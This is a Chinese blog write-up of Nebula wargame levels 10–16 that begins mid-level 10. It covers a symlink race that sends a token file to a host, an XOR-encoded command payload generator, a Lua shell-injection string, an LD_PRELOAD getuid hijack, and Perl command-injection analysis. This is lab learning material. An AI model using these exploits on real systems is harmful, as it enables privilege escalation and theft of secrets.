<p>本题的漏洞在于，先是检查文件是否可读，但是并没有打开，如果检查完文件可读之后，在建立tcp连接的过程中，我把文件改成一个level10不可读，但是flag10可读的文件，程序任然能正常运行，过程如下：<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">level1<span class="number">0</span><span class="variable">@nebula</span><span class="symbol">:/home/flag10</span><span class="variable">$ </span>vim /tmp/level1<span class="number">0</span>.sh</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="keyword">while</span> [ <span class="number">1</span> ];</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        ln -sf /tmp/a /tmp/fff</span><br><span class="line">        ln -sf /home/flag1<span class="number">0</span>/token /tmp/fff     </span><br><span class="line">done</span><br><span class="line">level1<span class="number">0</span><span class="variable">@nebula</span><span class="symbol">:/home/flag10</span><span class="variable">$ </span>bash /tmp/level1<span class="number">0</span>.sh</span><br><span class="line">level1<span class="number">0</span><span class="variable">@nebula</span><span class="symbol">:/home/flag10</span><span class="variable">$ </span><span class="keyword">while</span> [ <span class="number">1</span> ]; <span class="keyword">do</span> ./flag1<span class="number">0</span> /tmp/fff <span class="number">192.168</span>.<span class="number">56.1</span>; done</span><br><span class="line">-----------</span><br><span class="line">; 你会在本机上看到token文件内容</span><br></pre></td></tr></table></figure></p>
<h1 id="Level11">Level11</h1><p>还是C代码审计<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;unistd.h&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;string.h&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;sys/mman.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line"> * Return a random, non predictable file, and return the file descriptor for it.</span><br><span class="line"> */</span></span><br><span class="line"></span><br><span class="line">int getrand<span class="params">(char **path)</span></span><br><span class="line">&#123;</span><br><span class="line">  char <span class="built_in">*</span>tmp;</span><br><span class="line">  int pid;</span><br><span class="line">  int fd;</span><br><span class="line"></span><br><span class="line">  srandom<span class="params">(time<span class="params">(NULL)</span>)</span>;</span><br><span class="line"></span><br><span class="line">  tmp = getenv<span class="params">(<span class="string">"TEMP"</span>)</span>;</span><br><span class="line">  pid = getpid<span class="params">()</span>;</span><br><span class="line">  </span><br><span class="line">  asprintf<span class="params">(path, <span class="string">"%s/%d.%c%c%c%c%c%c"</span>, tmp, pid,</span><br><span class="line">      'A' + <span class="params">(random<span class="params">()</span> % <span class="number">26</span>)</span>, '<span class="number">0</span>' + <span class="params">(random<span class="params">()</span> % <span class="number">10</span>)</span>,</span><br><span class="line">      'a' + <span class="params">(random<span class="params">()</span> % <span class="number">26</span>)</span>, 'A' + <span class="params">(random<span class="params">()</span> % <span class="number">26</span>)</span>,</span><br><span class="line">      '<span class="number">0</span>' + <span class="params">(random<span class="params">()</span> % <span class="number">10</span>)</span>, 'a' + <span class="params">(random<span class="params">()</span> % <span class="number">26</span>)</span>)</span>;</span><br><span class="line"></span><br><span class="line">  fd = open<span class="params">(*path, O_CREAT|O_RDWR, <span class="number">0600</span>)</span>;</span><br><span class="line">  unlink<span class="params">(*path)</span>;</span><br><span class="line">  return fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void process<span class="params">(char *buffer, int length)</span></span><br><span class="line">&#123;</span><br><span class="line">  unsigned int key;</span><br><span class="line">  int i;</span><br><span class="line"></span><br><span class="line">  key = length &amp; <span class="number">0</span>xff;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span><span class="params">(i = <span class="number">0</span>; i &lt; length; i++)</span> &#123;</span><br><span class="line">      buffer[i] ^= key;</span><br><span class="line">      key -= buffer[i];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  system<span class="params">(buffer)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">#</span>define CL <span class="string">"Content-Length: "</span></span><br><span class="line"></span><br><span class="line">int main<span class="params">(int argc, char **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  char line[<span class="number">256</span>];</span><br><span class="line">  char buf[<span class="number">1024</span>];</span><br><span class="line">  char <span class="built_in">*</span>mem;</span><br><span class="line">  int length;</span><br><span class="line">  int fd;</span><br><span class="line">  char <span class="built_in">*</span>path;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span><span class="params">(fgets<span class="params">(line, sizeof<span class="params">(line)</span>, stdin)</span> == NULL)</span> &#123;</span><br><span class="line">      errx<span class="params">(<span class="number">1</span>, <span class="string">"reading from stdin"</span>)</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span><span class="params">(strncmp<span class="params">(line, CL, strlen<span class="params">(CL)</span>)</span> != <span class="number">0</span>)</span> &#123;</span><br><span class="line">      errx<span class="params">(<span class="number">1</span>, <span class="string">"invalid header"</span>)</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  length = atoi<span class="params">(line + strlen<span class="params">(CL)</span>)</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span><span class="params">(length &lt; sizeof<span class="params">(buf)</span>)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span><span class="params">(fread<span class="params">(buf, length, <span class="number">1</span>, stdin)</span> != length)</span> &#123;</span><br><span class="line">          err<span class="params">(<span class="number">1</span>, <span class="string">"fread length"</span>)</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      process<span class="params">(buf, length)</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      int blue = length;</span><br><span class="line">      int pink;</span><br><span class="line"></span><br><span class="line">      fd = getrand<span class="params">(&amp;path)</span>;</span><br><span class="line"></span><br><span class="line">      while<span class="params">(blue &gt; <span class="number">0</span>)</span> &#123;</span><br><span class="line">          printf<span class="params">(<span class="string">"blue = %d, length = %d, "</span>, blue, length)</span>;</span><br><span class="line"></span><br><span class="line">          pink = fread<span class="params">(buf, <span class="number">1</span>, sizeof<span class="params">(buf)</span>, stdin)</span>;</span><br><span class="line">          printf<span class="params">(<span class="string">"pink = %d\n"</span>, pink)</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span><span class="params">(pink &lt;= <span class="number">0</span>)</span> &#123;</span><br><span class="line">              err<span class="params">(<span class="number">1</span>, <span class="string">"fread fail(blue = %d, length = %d)"</span>, blue, length)</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          write<span class="params">(fd, buf, pink)</span>;</span><br><span class="line"></span><br><span class="line">          blue -= pink;</span><br><span class="line">      &#125;    </span><br><span class="line"></span><br><span class="line">      mem = mmap<span class="params">(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, <span class="number">0</span>)</span>;</span><br><span class="line">      <span class="keyword">if</span><span class="params">(mem == MAP_FAILED)</span> &#123;</span><br><span class="line">          err<span class="params">(<span class="number">1</span>, <span class="string">"mmap"</span>)</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      process<span class="params">(mem, length)</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这题应该不是很难，能看懂代码应该就能解出来，贴下我的payload脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_w_file</span><span class="params">(content)</span>:</span></span><br><span class="line">	f = open(<span class="string">"payload"</span>, <span class="string">"w"</span>)</span><br><span class="line">	f.write(content)</span><br><span class="line">	f.close()</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(command)</span>:</span></span><br><span class="line">	command += <span class="string">"\x00"</span></span><br><span class="line">	length = <span class="number">1024</span></span><br><span class="line">	count_length = length &amp; <span class="number">0xff</span></span><br><span class="line">	payload_command = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> command:</span><br><span class="line">		payload_command += chr((ord(x) ^ count_length) &amp; <span class="number">0xff</span>)</span><br><span class="line">		count_length -= ord(x)</span><br><span class="line">	payload_command += chr(count_length &amp; <span class="number">0xff</span>)</span><br><span class="line">	payload = <span class="string">"Content-Length: "</span> + str(length) + <span class="string">"\n"</span> + payload_command + <span class="string">"A"</span> * (length - len(payload_command) )</span><br><span class="line">	<span class="keyword">print</span> payload</span><br><span class="line">	<span class="comment">#my_w_file(payload)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">		main(sys.argv[<span class="number">1</span>])</span><br><span class="line">		</span><br><span class="line"><span class="comment"># $ python payload.py whoami | /home/flag11/flag11</span></span><br><span class="line"><span class="comment"># level11</span></span><br><span class="line"><span class="comment"># (╯‵□′)╯︵┻━┻  这特么。。。不做了。。看了涛涛的博客，还有第二种更简单的方法，可是都不行。。。shit!</span></span><br></pre></td></tr></table></figure></p>
<h1 id="Level12">Level12</h1><p>lua脚本的代码审计，好像是个后门脚本。。<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> socket = <span class="built_in">require</span>(<span class="string">"socket"</span>)</span><br><span class="line"><span class="keyword">local</span> server = <span class="built_in">assert</span>(socket.bind(<span class="string">"127.0.0.1"</span>, <span class="number">50001</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hash</span><span class="params">(password)</span></span></span><br><span class="line">  prog = <span class="built_in">io</span>.popen(<span class="string">"echo "</span>..password..<span class="string">" | sha1sum"</span>, <span class="string">"r"</span>)</span><br><span class="line">  data = prog:read(<span class="string">"*all"</span>)</span><br><span class="line">  prog:close()</span><br><span class="line"></span><br><span class="line">  data = <span class="built_in">string</span>.sub(data, <span class="number">1</span>, <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">local</span> client = server:accept()</span><br><span class="line">  client:send(<span class="string">"Password: "</span>)</span><br><span class="line">  client:settimeout(<span class="number">60</span>)</span><br><span class="line">  <span class="keyword">local</span> line, err = client:receive()</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> err <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">print</span>(<span class="string">"trying "</span> .. line) <span class="comment">-- log from where ;\</span></span><br><span class="line">      <span class="keyword">local</span> h = hash(line)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> h ~= <span class="string">"4754a4f4bd5787accd33de887b9250a0691dd198"</span> <span class="keyword">then</span></span><br><span class="line">          client:send(<span class="string">"Better luck next time\n"</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          client:send(<span class="string">"Congrats, your token is 413**CARRIER LOST**\n"</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  client:close()</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>
<p>这题你开着lua解释器试试就知道了。。问题在这行代码<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">prog</span> = io.popen(<span class="string">"echo "</span>..password..<span class="string">" | sha1sum"</span>, <span class="string">"r"</span>)</span><br><span class="line">-- payload: 4754a4f4bd5787accd33de887b9250a0691dd198;<span class="title">getflag</span> &gt; /tmp/get ;<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<p>没有对password做任何过滤，导致命令执行。<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">level12<span class="variable">@nebula</span><span class="symbol">:/tmp</span><span class="variable">$ </span>nc <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">50001</span></span><br><span class="line"><span class="constant">Password:</span> <span class="number">4754</span>a4f4bd5787accd33de887b9250a0691dd198;getflag &gt; <span class="regexp">/tmp/get</span> ;<span class="comment">#</span></span><br><span class="line"><span class="constant">Congrats,</span> your token is <span class="number">413</span>**<span class="constant">CARRIER LOST*</span>*</span><br><span class="line">level12<span class="variable">@nebula</span><span class="symbol">:/tmp</span><span class="variable">$ </span>cat /tmp/get </span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure></p>
<p>感觉nebula有问题。。。没能getshell成功</p>
<h1 id="Level13">Level13</h1><p>这题的C代码很简单<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;unistd.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> FAKEUID 1000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c;</span><br><span class="line">  <span class="keyword">char</span> token[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(getuid() != FAKEUID) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Security failure detected. UID %d started us, we expect %d\n"</span>, getuid(), FAKEUID);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"The system administrators will be notified of this violation\n"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// snip, sorry :)</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"your token is %s\n"</span>, token);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>代码简单了，可是不会做了，看了涛涛的wp后，学到了许多新知识<br>前置知识点1:</p>
<blockquote>
<p>LD_PRELOAD：</p>
<p>在Unix操作系统的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入Unix操作系统不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。 </p>
</blockquote>
<p>这题的思路就是劫持getuid函数 :<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">myuid.c</span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="keyword">uid_t</span> getuid(<span class="keyword">void</span>) &#123;</span><br><span class="line">        <span class="comment">//system("getflag &gt; /tmp/getflag13"); getshell失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>2: 编译动态链接库<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">level13<span class="variable">@nebula</span><span class="symbol">:/tmp</span><span class="variable">$ </span>gcc -shared myuid.c -o myuid.so</span><br><span class="line">level13<span class="variable">@nebula</span><span class="symbol">:/tLD_PRELOAD=/tmp/myuid</span>.so</span><br><span class="line">level13<span class="variable">@nebula</span><span class="symbol">:/tmp</span><span class="variable">$ </span>export <span class="constant">LD_PRELOAD</span></span><br><span class="line">level13<span class="variable">@nebula</span><span class="symbol">:/tmp</span><span class="variable">$ </span>cp /home/flag13/flag13 ./</span><br><span class="line">level13<span class="variable">@nebula</span><span class="symbol">:/tmp</span><span class="variable">$ </span>./flag13</span><br><span class="line">your token is b705702b-<span class="number">76</span>a8-<span class="number">42</span>b<span class="number">0</span>-<span class="number">8844</span>-<span class="number">3</span>adabbe5ac58</span><br></pre></td></tr></table></figure></p>
<p>flag13和myuid.so的ruid要一样，所以把flag13 copy过来。</p>
<h1 id="Level14">Level14</h1><p>给一个加密程序，然后解密token文件。。。。这是小学的找规律？<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#-*- coding:utf-<span class="number">8</span> -*-</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">"857:g67?5ABBo:BtDA?tIvLDKL&#123;MQPSRQWW."</span></span><br><span class="line">plain = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="function"><span class="title">range</span><span class="params">(len(cipher)</span></span>):</span><br><span class="line">	plain += <span class="function"><span class="title">chr</span><span class="params">(ord(cipher[x])</span></span> - x)</span><br><span class="line">	</span><br><span class="line">print plain</span><br></pre></td></tr></table></figure></p>
<p>得到token后<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">level14<span class="variable">@nebula</span><span class="symbol">:/home/flag14</span><span class="variable">$ </span>su flag14</span><br><span class="line"><span class="constant">Password:</span> </span><br><span class="line">sh-<span class="number">4.2</span><span class="variable">$ </span>getflag</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br><span class="line">sh-<span class="number">4.2</span><span class="variable">$ </span>whoami</span><br><span class="line">flag14</span><br></pre></td></tr></table></figure></p>
<h1 id="Level15">Level15</h1><p>暂无。。。前置技能没点够，LL的wp看不懂</p>
<h1 id="Level16">Level16</h1><p>perl代码审计<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env perl</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> CGI <span class="string">qw&#123;param&#125;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="sub"><span class="keyword">sub</span> login &#123;</span></span><br><span class="line">  <span class="variable">$username</span> = <span class="variable">$_</span>[<span class="number">0</span>];</span><br><span class="line">  <span class="variable">$password</span> = <span class="variable">$_</span>[<span class="number">1</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="variable">$username</span> =~ <span class="regexp">tr/a-z/A-Z/</span>; <span class="comment"># conver to uppercase</span></span><br><span class="line">  <span class="variable">$username</span> =~ <span class="regexp">s/\s.*//</span>;        <span class="comment"># strip everything after a space</span></span><br><span class="line"> </span><br><span class="line">  <span class="variable">@output</span> = <span class="string">`egrep "^$username" /home/flag16/userdb.txt 2&gt;&amp;1`</span>;</span><br><span class="line">  <span class="keyword">foreach</span> <span class="variable">$line</span> (<span class="variable">@output</span>) &#123;</span><br><span class="line">      (<span class="variable">$usr</span>, <span class="variable">$pw</span>) = <span class="keyword">split</span>(<span class="regexp">/:/</span>, <span class="variable">$line</span>);</span><br><span class="line">   </span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$pw</span> =~ <span class="variable">$password</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="sub"><span class="keyword">sub</span> htmlz &#123;</span></span><br><span class="line">  <span class="keyword">print</span>(<span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;"</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_</span>[<span class="number">0</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"Your login was accepted&lt;br/&gt;"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"Your login failed&lt;br/&gt;"</span>);</span><br><span class="line">  &#125;    </span><br><span class="line">  <span class="keyword">print</span>(<span class="string">"Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">htmlz(login(param(<span class="string">"username"</span>), param(<span class="string">"password"</span>)));</span><br></pre></td></tr></table></figure></p>
<p>问题出在这句，命令执行<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@output = <span class="escape">`e</span>grep <span class="string">"^$username"</span> /home/flag16/userdb.txt <span class="number">2</span>&gt;&amp;<span class="number">1</span><span class="escape">`;</span></span><br></pre></td></tr></table></figure></p>
<p>然后在之前对变量 <code>$username</code>做了两次过滤<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> =~ <span class="regexp">tr/a-z/A-Z/</span>; <span class="comment"># conver to uppercase</span></span><br><span class="line"><span class="variable">$username</span> =~ <span class="regexp">s/\s.*//</span>;        <span class="comment"># strip everything after a space</span></span><br></pre></td></tr></table></figure></p>
<p>一个是把所以字母变为大写，然后去掉空格后面的内容，可以这样测试 -&gt; 在shell中输入以下命令，<code>&lt;xxx&gt;</code> 为可控区域，也就是你能输入的地方<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ egrep <span class="string">"^&lt;xxx&gt;"</span> /home/flag16/userdb<span class="class">.txt</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>然后 <code>&lt;xxx&gt;</code> 里的内容不应该出现空格，因为空格后面的内容都会被过滤，然后所以字母都必须是大写的</p>
